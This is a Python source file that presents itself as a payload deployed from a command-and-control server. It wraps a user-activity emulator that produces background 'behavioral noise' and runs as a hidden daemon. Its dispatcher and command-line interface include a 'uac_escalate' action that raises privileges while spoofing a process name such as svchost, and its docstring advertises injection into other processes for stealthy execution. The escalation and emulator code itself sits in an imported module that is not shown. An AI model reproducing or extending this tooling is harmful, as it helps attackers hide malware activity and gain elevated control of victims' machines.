"""
Remote Payload: User Activity Emulator

Designed to run as a C2-deployed payload for background behavioral noise generation.
Can be:
1. Imported and called directly from agent code
2. Executed as standalone payload via C2 command
3. Injected into another process for stealthy execution

Integration Points:
- Works with threat_calibration.py for dynamic threat-driven activity
- Works with behavioral_noise.py for synchronized noise
- Works with c2_routing_engine.py for command/control
"""

import json
import logging
import time
import threading
import sys
import os
from typing import Dict, Any, Optional
from pathlib import Path

logger = logging.getLogger(__name__)


class RemoteActivityPayload:
    """
    Minimal wrapper for user_activity_emulator that supports remote deployment.
    
    Usage:
        # From C2 command:
        payload = RemoteActivityPayload()
        result = payload.execute_from_config({
            "action": "emit_activity",
            "threat_level": 75,
            "intention": "work",
            "duration": 300
        })
        
        # Or directly:
        payload = RemoteActivityPayload()
        payload.start_daemon(threat_level=60, duration=600)
    """
    
    def __init__(self, config_path: Optional[str] = None):
        """
        Initialize remote payload.
        
        Args:
            config_path: Optional path to JSON config (for parameterization)
        """
        self.config_path = config_path or "config.json"
        self.config: Dict[str, Any] = {}
        self.emulator = None
        self.daemon_thread: Optional[threading.Thread] = None
        self.is_running = False
        self.execution_log: list = []
        
        # Try to import emulator
        try:
            from user_activity_emulator import UserActivityEmulator
            self.emulator = UserActivityEmulator()
            self.emulator_available = True
        except ImportError as e:
            logger.warning(f"[RemotePayload] UserActivityEmulator not available: {e}")
            self.emulator_available = False
        
        # Load config if available
        self._load_config()
    
    def _load_config(self) -> bool:
        """Load configuration from file"""
        try:
            if os.path.exists(self.config_path):
                with open(self.config_path, 'r') as f:
                    self.config = json.load(f)
                logger.info(f"[RemotePayload] Config loaded from {self.config_path}")
                return True
        except Exception as e:
            logger.debug(f"[RemotePayload] Config load failed: {e}")
        return False
    
    def execute_from_config(self, command: Dict[str, Any]) -> Dict[str, Any]:
        """
        Execute a remote command from C2.
        
        Args:
            command: JSON command dict with:
                {
                    "action": "emit_activity|start_daemon|uac_escalate|stop",
                    "threat_level": 0-100,
                    "intention": "browse|compose|work|research|aggressive",
                    "duration": seconds (for daemon mode),
                    "process_spoof": "svchost|rundll32|...",
                    ...
                }
        
        Returns:
            Result dict with status, details, log
        """
        if not self.emulator_available:
            return {
                "status": "error",
                "message": "Emulator not available",
                "log": self.execution_log
            }
        
        try:
            action = command.get("action", "emit_activity")
            threat_level = command.get("threat_level", 50)
            intention = command.get("intention", "default")
            duration = command.get("duration", 0)
            
            self.execution_log.append({
                "timestamp": time.time(),
                "action": action,
                "config": command
            })
            
            # ================= ACTION: emit_activity =================
            if action == "emit_activity":
                self.emulator.emit_user_activity(  # type: ignore
                    threat_level=threat_level,
                    intention=intention
                )
                return {
                    "status": "success",
                    "action": "emit_activity",
                    "threat_level": threat_level,
                    "log": self.execution_log
                }
            
            # ================= ACTION: start_daemon =================
            elif action == "start_daemon":
                if self.is_running:
                    return {
                        "status": "already_running",
                        "message": "Daemon already active",
                        "log": self.execution_log
                    }
                
                self.is_running = True
                self.daemon_thread = threading.Thread(
                    target=self._daemon_loop,
                    args=(threat_level, intention, duration),
                    daemon=True
                )
                self.daemon_thread.start()
                
                return {
                    "status": "started",
                    "action": "start_daemon",
                    "threat_level": threat_level,
                    "duration": duration,
                    "intention": intention,
                    "log": self.execution_log
                }
            
            # ================= ACTION: stop_daemon =================
            elif action == "stop":
                self.is_running = False
                return {
                    "status": "stopped",
                    "action": "stop",
                    "log": self.execution_log
                }
            
            # ================= ACTION: uac_escalate =================
            elif action == "uac_escalate":
                exe_path = command.get("exe_path", "C:\\Windows\\System32\\cmd.exe")
                args = command.get("args", "")
                spoof = command.get("process_spoof", "svchost")
                
                # Use spoofing if available
                if spoof and spoof != "none":
                    self.emulator.uac_escalate_as_process(spoof, args)  # type: ignore
                else:
                    self.emulator.uac_escalation(exe_path, args)  # type: ignore
                
                return {
                    "status": "escalation_triggered",
                    "action": "uac_escalate",
                    "spoof": spoof,
                    "log": self.execution_log
                }
            
            # ================= ACTION: status =================
            elif action == "status":
                return {
                    "status": "ok",
                    "is_running": self.is_running,
                    "emulator_available": self.emulator_available,
                    "log": self.execution_log
                }
            
            else:
                return {
                    "status": "error",
                    "message": f"Unknown action: {action}",
                    "log": self.execution_log
                }
        
        except Exception as e:
            logger.error(f"[RemotePayload] Execution error: {e}")
            return {
                "status": "error",
                "message": str(e),
                "log": self.execution_log
            }
    
    def _daemon_loop(self, threat_level: int, intention: str, duration: int) -> None:
        """
        Background daemon loop for continuous behavioral noise.
        
        Args:
            threat_level: Initial threat level (0-100)
            intention: User intention
            duration: Run for N seconds (0 = indefinite)
        """
        start_time = time.time()
        cycle = 0
        
        logger.info(f"[RemotePayload] Daemon started: threat={threat_level}, intention={intention}, duration={duration}s")
        
        while self.is_running:
            try:
                # Check duration limit
                if duration > 0:
                    elapsed = time.time() - start_time
                    if elapsed > duration:
                        logger.info(f"[RemotePayload] Duration limit reached ({elapsed:.1f}s)")
                        self.is_running = False
                        break
                
                cycle += 1
                
                # Emit activity at specified threat level
                self.emulator.emit_user_activity(  # type: ignore
                    threat_level=threat_level,
                    intention=intention
                )
                
                logger.debug(f"[RemotePayload] Cycle {cycle}: threat={threat_level}, intention={intention}")
                
                # Variable delay between cycles (3-8 seconds)
                delay = 3 + (threat_level / 100.0) * 5  # Higher threat = shorter delay
                time.sleep(delay)
            
            except Exception as e:
                logger.error(f"[RemotePayload] Daemon loop error: {e}")
                time.sleep(1)
        
        logger.info(f"[RemotePayload] Daemon stopped after {cycle} cycles")
    
    def start_daemon(self, threat_level: int = 50, intention: str = "browse", duration: int = 0) -> bool:
        """
        Start background behavioral noise daemon.
        
        Args:
            threat_level: Threat level (0-100)
            intention: User intention
            duration: Run for N seconds (0 = indefinite)
        
        Returns:
            True if started successfully
        """
        return self.execute_from_config({
            "action": "start_daemon",
            "threat_level": threat_level,
            "intention": intention,
            "duration": duration
        })["status"] == "started"
    
    def stop_daemon(self) -> bool:
        """Stop background daemon"""
        self.is_running = False
        return True
    
    def get_status(self) -> Dict[str, Any]:
        """Get payload status"""
        return {
            "is_running": self.is_running,
            "emulator_available": self.emulator_available,
            "execution_log_entries": len(self.execution_log),
            "config_loaded": bool(self.config)
        }


# ============================================================================
# STANDALONE EXECUTION (for direct remote deployment)
# ============================================================================

def main():
    """
    Standalone entry point for C2 deployment.
    
    Usage:
        # Remote execution via C2:
        python payload_user_activity_remote.py --action emit_activity --threat 75 --intention work
        python payload_user_activity_remote.py --action start_daemon --threat 60 --duration 300
        python payload_user_activity_remote.py --action uac_escalate --spoof svchost
    """
    import argparse
    
    parser = argparse.ArgumentParser(description="Remote User Activity Emulator Payload")
    parser.add_argument("--action", default="emit_activity", 
                       choices=["emit_activity", "start_daemon", "stop", "uac_escalate", "status"],
                       help="Action to perform")
    parser.add_argument("--threat", type=int, default=50, help="Threat level (0-100)")
    parser.add_argument("--intention", default="browse", help="User intention")
    parser.add_argument("--duration", type=int, default=0, help="Duration for daemon mode (seconds)")
    parser.add_argument("--spoof", default="svchost", help="Process to spoof as (for UAC)")
    parser.add_argument("--exe", default="C:\\Windows\\System32\\cmd.exe", help="Executable to escalate")
    parser.add_argument("--args", default="", help="Arguments for executable")
    parser.add_argument("--config", default="config.json", help="Config file path")
    parser.add_argument("--log-level", default="INFO", choices=["DEBUG", "INFO", "WARNING", "ERROR"])
    
    args = parser.parse_args()
    
    # Setup logging
    log_level = getattr(logging, args.log_level.upper())
    logging.basicConfig(
        level=log_level,
        format='[%(asctime)s] [%(name)s] [%(levelname)s] %(message)s'
    )
    
    logger.info(f"[RemotePayload] Starting: action={args.action}")
    
    # Create and execute payload
    payload = RemoteActivityPayload(config_path=args.config)
    
    command = {
        "action": args.action,
        "threat_level": args.threat,
        "intention": args.intention,
        "duration": args.duration,
        "process_spoof": args.spoof,
        "exe_path": args.exe,
        "args": args.args
    }
    
    result = payload.execute_from_config(command)
    
    # Output result as JSON (for C2 parsing)
    print(json.dumps(result, indent=2, default=str))
    
    # If daemon mode, wait indefinitely
    if args.action == "start_daemon" and result["status"] == "started":
        logger.info("[RemotePayload] Daemon running (Ctrl+C to stop)")
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            logger.info("[RemotePayload] Stopping daemon...")
            payload.stop_daemon()
    
    return 0 if result["status"] != "error" else 1


if __name__ == "__main__":
    sys.exit(main())
